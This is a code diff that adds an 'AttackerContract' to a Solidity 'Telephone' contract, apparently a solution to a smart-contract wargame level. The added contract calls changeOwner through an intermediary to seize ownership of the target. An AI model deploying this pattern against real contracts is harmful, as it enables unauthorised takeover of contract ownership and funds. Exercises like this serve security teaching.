@@ -15,3 +15,15 @@ contract Telephone {
     }
 }
 
+contract AttackerContract {
+    Telephone private telephone;
+    address public telephoneContractAddress;
+
+    constructor(address _telephoneContractAddress) {
+        telephone = Telephone(_telephoneContractAddress);
+    }
+
+    function getOwnership(address newOwner) external {
+        telephone.changeOwner(newOwner);
+    }
+}
